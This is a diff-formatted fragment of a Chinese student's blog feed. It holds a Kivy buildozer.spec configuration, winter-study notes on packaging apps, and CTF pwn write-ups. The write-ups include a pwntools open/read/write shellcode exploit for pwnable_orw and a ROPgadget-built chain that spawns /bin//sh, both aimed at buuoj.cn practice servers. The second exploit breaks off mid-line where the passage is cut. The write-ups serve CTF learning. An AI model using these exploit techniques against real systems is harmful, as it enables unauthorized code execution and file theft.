class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Kivy version to use</span></span><br><span class="line">osx.kivy_version = <span class="number">1.9</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># Android specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Indicate if the application should be fullscreen or not</span></span><br><span class="line">fullscreen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (string) Presplash background color (for new android toolchain)</span></span><br><span class="line"><span class="meta"># Supported formats are: #RRGGBB #AARRGGBB or one of the following names:</span></span><br><span class="line"><span class="meta"># red, blue, green, black, white, gray, cyan, magenta, yellow, lightgray,</span></span><br><span class="line"><span class="meta"># darkgray, grey, lightgrey, darkgrey, aqua, fuchsia, lime, maroon, navy,</span></span><br><span class="line"><span class="meta"># olive, purple, silver, teal.</span></span><br><span class="line"><span class="meta">#android.presplash_color = #FFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (string) Presplash animation using Lottie format.</span></span><br><span class="line"><span class="meta"># see https://lottiefiles.com/ for examples and https://airbnb.design/lottie/</span></span><br><span class="line"><span class="meta"># for general documentation.</span></span><br><span class="line"><span class="meta"># Lottie files can be created using various tools, like Adobe After Effect or Synfig.</span></span><br><span class="line"><span class="meta">#android.presplash_lottie = &quot;path/to/lottie/file.json&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="meta"># (str) Adaptive icon of the application (used if Android API level is 26+ at runtime)</span></span><br><span class="line"><span class="meta">#icon.adaptive_foreground.filename = %(source.dir)s/data/icon_fg.png</span></span><br><span class="line"><span class="meta">#icon.adaptive_background.filename = %(source.dir)s/data/icon_bg.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Permissions</span></span><br><span class="line">android.permissions = INTERNET</span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Target Android API, should be as high as possible.</span></span><br><span class="line"><span class="meta">#android.api = 27</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Minimum API your APK will support.</span></span><br><span class="line"><span class="meta">#android.minapi = 21</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Android SDK version to use</span></span><br><span class="line"><span class="meta">#android.sdk = 20</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android NDK version to use</span></span><br><span class="line"><span class="meta">#android.ndk = 19b</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Android NDK API to use. This is the minimum API your app will support, it should usually match android.minapi.</span></span><br><span class="line"><span class="meta">#android.ndk_api = 21</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Use --private data storage (True) or --dir public storage (False)</span></span><br><span class="line"><span class="meta">#android.private_storage = True</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android NDK directory (if empty, it will be automatically downloaded.)</span></span><br><span class="line"><span class="meta">#android.ndk_path =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android SDK directory (if empty, it will be automatically downloaded.)</span></span><br><span class="line"><span class="meta">#android.sdk_path =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) ANT directory (if empty, it will be automatically downloaded.)</span></span><br><span class="line"><span class="meta">#android.ant_path =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) If True, then skip trying to update the Android sdk</span></span><br><span class="line"><span class="meta"># This can be useful to avoid excess Internet downloads or save time</span></span><br><span class="line"><span class="meta"># when an update is due and you just want to test/build your package</span></span><br><span class="line"><span class="meta"># android.skip_update = False</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) If True, then automatically accept SDK license</span></span><br><span class="line"><span class="meta"># agreements. This is intended for automation only. If set to False,</span></span><br><span class="line"><span class="meta"># the default, you will be shown the license when first running</span></span><br><span class="line"><span class="meta"># buildozer.</span></span><br><span class="line"><span class="meta"># android.accept_sdk_license = False</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android entry point, default is ok for Kivy-based app</span></span><br><span class="line"><span class="meta">#android.entrypoint = org.renpy.android.PythonActivity</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android app theme, default is ok for Kivy-based app</span></span><br><span class="line"><span class="meta"># android.apptheme = &quot;@android:style/Theme.NoTitleBar&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Pattern to whitelist for the whole project</span></span><br><span class="line"><span class="meta">#android.whitelist =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to a custom whitelist file</span></span><br><span class="line"><span class="meta">#android.whitelist_src =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to a custom blacklist file</span></span><br><span class="line"><span class="meta">#android.blacklist_src =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of Java .jar files to add to the libs so that pyjnius can access</span></span><br><span class="line"><span class="meta"># their classes. Don&#x27;t add jars that you do not need, since extra jars can slow</span></span><br><span class="line"><span class="meta"># down the build process. Allows wildcards matching, for example:</span></span><br><span class="line"><span class="meta"># OUYA-ODK/libs/*.jar</span></span><br><span class="line"><span class="meta">#android.add_jars = foo.jar,bar.jar,path/to/more/*.jar</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of Java files to add to the android project (can be java or a</span></span><br><span class="line"><span class="meta"># directory containing the files)</span></span><br><span class="line"><span class="meta">#android.add_src =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android AAR archives to add (currently works only with sdl2_gradle</span></span><br><span class="line"><span class="meta"># bootstrap)</span></span><br><span class="line"><span class="meta">#android.add_aars =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Gradle dependencies to add (currently works only with sdl2_gradle</span></span><br><span class="line"><span class="meta"># bootstrap)</span></span><br><span class="line"><span class="meta">#android.gradle_dependencies =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) add java compile options</span></span><br><span class="line"><span class="meta"># this can for example be necessary when importing certain java libraries using the &#x27;android.gradle_dependencies&#x27; option</span></span><br><span class="line"><span class="meta"># see https://developer.android.com/studio/write/java8-support for further information</span></span><br><span class="line"><span class="meta"># android.add_compile_options = &quot;sourceCompatibility = 1.8&quot;, &quot;targetCompatibility = 1.8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Gradle repositories to add &#123;can be necessary for some android.gradle_dependencies&#125;</span></span><br><span class="line"><span class="meta"># please enclose in double quotes </span></span><br><span class="line"><span class="meta"># e.g. android.gradle_repositories = &quot;maven &#123; url &#x27;https://kotlin.bintray.com/ktor&#x27; &#125;&quot;</span></span><br><span class="line"><span class="meta">#android.add_gradle_repositories =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) packaging options to add </span></span><br><span class="line"><span class="meta"># see https://google.github.io/android-gradle-dsl/current/com.android.build.gradle.internal.dsl.PackagingOptions.html</span></span><br><span class="line"><span class="meta"># can be necessary to solve conflicts in gradle_dependencies</span></span><br><span class="line"><span class="meta"># please enclose in double quotes </span></span><br><span class="line"><span class="meta"># e.g. android.add_packaging_options = &quot;exclude &#x27;META-INF/common.kotlin_module&#x27;&quot;, &quot;exclude &#x27;META-INF/*.kotlin_module&#x27;&quot;</span></span><br><span class="line"><span class="meta">#android.add_gradle_repositories =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Java classes to add as activities to the manifest.</span></span><br><span class="line"><span class="meta">#android.add_activities = com.example.ExampleActivity</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) OUYA Console category. Should be one of GAME or APP</span></span><br><span class="line"><span class="meta"># If you leave this blank, OUYA support will not be enabled</span></span><br><span class="line"><span class="meta">#android.ouya.category = GAME</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Filename of OUYA Console icon. It must be a 732x412 png image.</span></span><br><span class="line"><span class="meta">#android.ouya.icon.filename = %(source.dir)s/data/ouya_icon.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) XML file to include as an intent filters in &lt;activity&gt; tag</span></span><br><span class="line"><span class="meta">#android.manifest.intent_filters =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) launchMode to set for the main activity</span></span><br><span class="line"><span class="meta">#android.manifest.launch_mode = standard</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android additional libraries to copy into libs/armeabi</span></span><br><span class="line"><span class="meta">#android.add_libs_armeabi = libs/android/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_armeabi_v7a = libs/android-v7/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_arm64_v8a = libs/android-v8/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_x86 = libs/android-x86/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_mips = libs/android-mips/*.so</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Indicate whether the screen should stay on</span></span><br><span class="line"><span class="meta"># Don&#x27;t forget to add the WAKE_LOCK permission if you set this to True</span></span><br><span class="line"><span class="meta">#android.wakelock = False</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android application meta-data to set (key=value format)</span></span><br><span class="line"><span class="meta">#android.meta_data =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android library project to add (will be added in the</span></span><br><span class="line"><span class="meta"># project.properties automatically.)</span></span><br><span class="line"><span class="meta">#android.library_references =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android shared libraries which will be added to AndroidManifest.xml using &lt;uses-library&gt; tag</span></span><br><span class="line"><span class="meta">#android.uses_library =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android logcat filters to use</span></span><br><span class="line"><span class="meta">#android.logcat_filters = *:S python:D</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Copy library instead of making a libpymodules.so</span></span><br><span class="line"><span class="meta">#android.copy_libs = 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64</span></span><br><span class="line">android.arch = armeabi-v7a</span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) overrides automatic versionCode computation (used in build.gradle)</span></span><br><span class="line"><span class="meta"># this is not the same as app version and should only be edited if you know what you&#x27;re doing</span></span><br><span class="line"><span class="meta"># android.numeric_version = 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#(bool) enables Android auto backup feature (Android API &gt;=23)</span></span><br><span class="line">android.allow_backup = True</span><br><span class="line"></span><br><span class="line"><span class="meta">#(str) XML file for custom backup rules (see official auto backup documentation)</span></span><br><span class="line"><span class="meta">#android.backup_rules =</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#(str) If you need to insert variables into your AndroidManifest.xml file,</span></span><br><span class="line"><span class="meta">#you can do so with the manifestPlaceholders property.</span></span><br><span class="line"><span class="meta">#This property takes a map of key-value pairs. (via a string)</span></span><br><span class="line"><span class="meta">#Usage example : android.manifest_placeholders = [myCustomUrl:&quot;org.kivy.customurl&quot;]</span></span><br><span class="line"><span class="meta">#android.manifest_placeholders = [:]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#(bool) disables the compilation of py to pyc/pyo files when packaging</span></span><br><span class="line"><span class="meta">#android.no-compile-pyo = True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># Python for android (p4a) specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) python-for-android fork to use, defaults to upstream (kivy)</span></span><br><span class="line"><span class="meta">#p4a.fork = kivy</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) python-for-android branch to use, defaults to master</span></span><br><span class="line"><span class="meta">#p4a.branch = master</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) python-for-android git clone directory (if empty, it will be automatically cloned from github)</span></span><br><span class="line"><span class="meta">#p4a.source_dir =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) The directory in which python-for-android should look for your own build recipes (if any)</span></span><br><span class="line"><span class="meta">#p4a.local_recipes =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Filename to the hook for p4a</span></span><br><span class="line"><span class="meta">#p4a.hook =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Bootstrap to use for android builds</span></span><br><span class="line"><span class="meta"># p4a.bootstrap = sdl2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) port number to specify an explicit --port= p4a argument (eg for bootstrap flask)</span></span><br><span class="line"><span class="meta">#p4a.port =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Control passing the --use-setup-py vs --ignore-setup-py to p4a</span></span><br><span class="line"><span class="meta"># &quot;in the future&quot; --use-setup-py is going to be the default behaviour in p4a, right now it is not</span></span><br><span class="line"><span class="meta"># Setting this to false will pass --ignore-setup-py, true will pass --use-setup-py</span></span><br><span class="line"><span class="meta"># NOTE: this is general setuptools integration, having pyproject.toml is enough, no need to generate</span></span><br><span class="line"><span class="meta"># setup.py if you&#x27;re using Poetry, but you need to add &quot;toml&quot; to source.include_exts.</span></span><br><span class="line"><span class="meta">#p4a.setup_py = false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># iOS specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to a custom kivy-ios folder</span></span><br><span class="line"><span class="meta">#ios.kivy_ios_dir = ../kivy-ios</span></span><br><span class="line"><span class="meta"># Alternately, specify the URL and branch of a git checkout:</span></span><br><span class="line">ios.kivy_ios_url = https:<span class="comment">//github.com/kivy/kivy-ios</span></span><br><span class="line">ios.kivy_ios_branch = master</span><br><span class="line"></span><br><span class="line"><span class="meta"># Another platform dependency: ios-deploy</span></span><br><span class="line"><span class="meta"># Uncomment to use a custom checkout</span></span><br><span class="line"><span class="meta">#ios.ios_deploy_dir = ../ios_deploy</span></span><br><span class="line"><span class="meta"># Or specify URL and branch</span></span><br><span class="line">ios.ios_deploy_url = https:<span class="comment">//github.com/phonegap/ios-deploy</span></span><br><span class="line">ios.ios_deploy_branch = <span class="number">1.10</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Whether or not to sign the code</span></span><br><span class="line">ios.codesign.allowed = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Name of the certificate to use for signing the debug version</span></span><br><span class="line"><span class="meta"># Get a list of available identities: buildozer ios list_identities</span></span><br><span class="line"><span class="meta">#ios.codesign.debug = &quot;iPhone Developer: &lt;lastname&gt; &lt;firstname&gt; (&lt;hexstring&gt;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Name of the certificate to use for signing the release version</span></span><br><span class="line"><span class="meta">#ios.codesign.release = %(ios.codesign.debug)s</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[buildozer]</span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))</span></span><br><span class="line">log_level = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Display warning if buildozer is run as root (0 = False, 1 = True)</span></span><br><span class="line">warn_on_root = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to build artifact storage, absolute or relative to spec file</span></span><br><span class="line"><span class="meta"># build_dir = ./.buildozer</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to build output (i.e. .apk, .ipa) storage</span></span><br><span class="line"><span class="meta"># bin_dir = ./bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#    -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="meta">#    List as sections</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    You can define all the &quot;list&quot; as [section:key].</span></span><br><span class="line"><span class="meta">#    Each line will be considered as a option to the list.</span></span><br><span class="line"><span class="meta">#    Let&#x27;s take [app] / source.exclude_patterns.</span></span><br><span class="line"><span class="meta">#    Instead of doing:</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app]</span></span><br><span class="line"><span class="meta">#source.exclude_patterns = license,data/audio/*.wav,data/images/original/*</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    This can be translated into:</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app:source.exclude_patterns]</span></span><br><span class="line"><span class="meta">#license</span></span><br><span class="line"><span class="meta">#data/audio/*.wav</span></span><br><span class="line"><span class="meta">#data/images/original/*</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#    -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="meta">#    Profiles</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    You can extend section / key with a profile</span></span><br><span class="line"><span class="meta">#    For example, you want to deploy a demo version of your application without</span></span><br><span class="line"><span class="meta">#    HD content. You could first change the title to add &quot;(demo)&quot; in the name</span></span><br><span class="line"><span class="meta">#    and extend the excluded directories to remove the HD content.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app@demo]</span></span><br><span class="line"><span class="meta">#title = My Application (demo)</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#[app:source.exclude_patterns@demo]</span></span><br><span class="line"><span class="meta">#images/hd/*</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#    Then, invoke the command line with the &quot;demo&quot; profile:</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#buildozer --profile demo android debug</span></span><br></pre></td></tr></table></figure>
+<h1 id="沙箱初体验（pwnable-orw"><a href="#沙箱初体验（pwnable-orw" class="headerlink" title="沙箱初体验（pwnable_orw)"></a>沙箱初体验（pwnable_orw)</h1><p>确实很新奇嗷，照着buu上题目顺序来做，没想到这么快就接触到了沙箱的题目，<del>而我堆都还没玩明白</del></p>
+<p>那废话不多说，先来看看文件吧。这时候问题就出现了，不知道为啥就被拦下了，附件不让下载。</p>
+<p><img src="/img/1643120343756.png" alt="1643120343756"></p>
+<p>xs，只好去网上找dalao们写的博客，好巧不巧就发现了这是个沙箱的题目。</p>
+<p>于是只好拿网上的图片来看</p>
+<p><img src="/img/1643120358026.png" alt="1643120358026"></p>
+<p>搞懂了基本原理，那就实操一下，只能利用open、read、write三个函数来读取flag。</p>
+<p>看完dalao的博客，真的学到了，居然还有这样的方法来拿flag，<del>哈哈哈哈哈哈</del></p>
+<p><img src="/img/1643120371790.png" alt="1643120371790"></p>
+<p>最后脚本附上一跑，就真成了<del>（我是二傻子）</del></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27261</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="hgamectf2022开赛"><a href="#hgamectf2022开赛" class="headerlink" title="hgamectf2022开赛"></a>hgamectf2022开赛</h2><ul>
-<li>这两天的hgamectf2022也开始了，题目很新颖，我也学到了不少，但是作为一个pwn手吧，比较丢脸的就是一个pwn题都没做出来，虽然其他方向的题目出了不少，也成功挤进前一百名，但这只是暂时的，我还需要继续努力，把自己的主方向强大起来！</li>
-<li>留个图嘿嘿，最高排到39名好像</li>
-</ul>
-<p><img src="/img/1643119698683.png" alt="1643119698683"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
-<li>这一周收获还是挺多的，学会了buildozer打包，见识了新的ctf题型，又下了两个新软件，真的是活到老学到老，只有不断的学习，才不会落后，冲冲冲！</li>
-<li>下周好像要开始大一新生的培训了，预计寒假结束还是会给他们进行一个考核赛，这就涉及到需要我们出题，到时候时间会越来越紧，不过这样也过得充实！这个寒假这样过才不算荒废！</li>
-</ul>
 ]]></content>
       <categories>
-        <category>2022</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>寒假学习(三)</title>
-    <url>/2022/02/06/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%882022.1.31-2022.2.6%EF%BC%89/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="学习进度总结（三）（2022-1-31-2022-2-6）"><a href="#学习进度总结（三）（2022-1-31-2022-2-6）" class="headerlink" title="学习进度总结（三）（2022.1.31-2022.2.6）"></a>学习进度总结（三）（2022.1.31-2022.2.6）</h1><h2 id="作品赛ing"><a href="#作品赛ing" class="headerlink" title="作品赛ing"></a>作品赛ing</h2><p>新年快乐！初一、初二两天有事在成都待了两天，但是没有闲着，一直也在解决打包难的问题。在网上各种找资料，发现用kivy打包apk的事都好久远了，没多少人用，更别说有报错分析的。于是只好自己一步一步摸索，还好功夫不负有心人，初三回家之后基本上算是把buildozer打包问题搞明白了，主要注意<strong>buildozer.spec</strong>文件里面的几个部分必须修改对：</p>
-<ol>
-<li><p>文件名称</p>
-<p>很多时候打包不成功就是因为文件名称对不上main.py里面的函数名，后来每一次都改，也就没有在出过问题。</p>
-</li>
-<li><p>绝对路径</p>
-<p>在配置文件里，main.py的路径一定要填写正确</p>
-</li>
-<li><p>配置要求</p>
-<p>配置文件里面的<strong>requirements</strong>这一部分必须要填写完整，只要整个打包文件夹里包含到的需要使用的一些插件都需要写上，这样在打包时才会下载这些插件，最后打包出来才不会报错，也不会闪退</p>
-</li>
-<li><p>source.include_exts</p>
-<p>这一行内容默认的一般是py,png,jpg,kv,atlas，但是很多时候自己的文件内容可能不止这些文件类型包含，这时候也需要自行添加，否则打包后就会出现闪退现象，例如有ttf格式文件，就加上ttf</p>
-</li>
-<li><p>网络要求</p>
-<p><strong>android.permissions = INTERNET</strong>这一行也是必须打开的，默认前面有#号，是没有使用的，需要自己打开，不然打包好也是闪退</p>
-</li>
-</ol>
-<p>反正问题很多，这也只是我暂时总结出来的一些打包经验，如果后面打包途中再遇上什么问题，我再继续补充……</p>
-<p>然后打包之余也有在学习kivy的一些内容，我们现在的项目内容有一个最大的难点就是还没有关键技术，如果一直没有关键技术的话，基本上做出来也不会有多大的作用和效果，所以还得继续钻研，最晚五月份交作品，时间还是挺多的，四个人好好加油，相信一定能攻破难关！</p>
-<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>寒假的时间确实大部分都在走亲访友中度过了，再加上作品赛一整，很是没有太多时间拿来学习ctf，hgame就打了第一周的，之后的每周有wp出来我也在看，还是觉得自己学的太浅了，pwn确实是任重道远，我现在的水平无法做到保证在正式比赛中有pwn方向的输出，但是我在尽力调整，争取在下学期国赛等大赛来临之前达到能保证输出的水平，为XJUSEC贡献一份力量！继续加油吧！</p>
-]]></content>
-      <categories>
-        <category>2022</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>静态编译rop题目解题法</title>
-    <url>/2021/12/20/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91rop%E9%A2%98%E7%9B%AE%E8%A7%A3%E9%A2%98%E6%B3%95/</url>
-    <content><![CDATA[<span id="more"></span>
-<h2 id="Linux系统调用-int-80h（int-0x80）"><a href="#Linux系统调用-int-80h（int-0x80）" class="headerlink" title="Linux系统调用 int 80h（int 0x80）"></a>Linux系统调用 int 80h（int 0x80）</h2><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>在计算机中，系统调用（英语：system call），又称为系统呼叫，指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。 系统调用提供了用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信。</p>
-<p>Linux的系统调用通过int 80h实现，用系统调用号来区分入口函数。 操作系统实现系统调用的基本过程是：<br>      应用程序调用库函数（API）；<br>      API将系统调用号存入EAX，然后通过中断调用使系统进入内核态；<br>      内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；<br>     系统调用完成相应功能，将返回值存入EAX，返回到中断处理函数；<br>     中断处理函数返回到API中；<br>     API将EAX返回给应用程序。</p>
-<h5 id="很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。"><a href="#很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。" class="headerlink" title="很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。"></a><del>很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。</del></h5><h2 id="判断静态编译"><a href="#判断静态编译" class="headerlink" title="判断静态编译"></a>判断静态编译</h2><p><strong>只要ida打开看起来很复杂的，都是静态编译的结果。这种情况下的好处就是不会调用libc中的东西，所以我们不用泄露libc版本来利用里libc函数。</strong></p>
-<h2 id="解决题目"><a href="#解决题目" class="headerlink" title="解决题目"></a>解决题目</h2><p>ROPgadget有一个很强大的功能，直接利用程序中的片段拼凑rop链。</p>
-<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">ROPgadget</span> --<span class="comment">binary</span> <span class="comment">rop</span> --<span class="comment">ropchain</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="例题：inndy-rop（假的，只是为了静态编译放这儿的）"><a href="#例题：inndy-rop（假的，只是为了静态编译放这儿的）" class="headerlink" title="例题：inndy_rop（假的，只是为了静态编译放这儿的）"></a>例题：inndy_rop<del>（假的，只是为了静态编译放这儿的）</del></h3><p>32位文件，静态编译，开NX，所以直接</p>
-<p><img src="/img/1643119949088.png" alt="1643119949088"></p>
-<p> 最后稍作修改 </p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import <span class="keyword">pack</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">q</span> = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25783</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">def payload():</span><br><span class="line">    p = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xc</span> + <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov 